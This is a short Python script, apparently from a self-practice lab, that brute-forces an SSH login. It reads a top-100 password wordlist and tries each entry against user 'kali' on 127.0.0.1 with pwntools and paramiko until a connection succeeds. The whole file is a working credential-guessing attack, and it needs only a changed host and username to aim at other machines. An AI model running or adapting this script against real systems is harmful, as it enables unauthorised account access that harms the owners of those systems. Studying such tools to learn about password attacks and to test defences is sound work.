from pwn import *
import paramiko
import subprocess
from sshd_configurator import SSH_Configurator
	
SSH_Configurator()
host = '127.0.0.1'
username = 'kali'
attempts = 0

with open("top_100_passwords.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting Password: '{}'".format(attempts, password))
			response = ssh(host = host, user = username, password = password, timeout = 1)
			if response.connected():
			 print("[>] Valid password found: '{}'".format(password))
			 response.close()
			 break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid Password: '{}'".format(password))
		attempts +=1
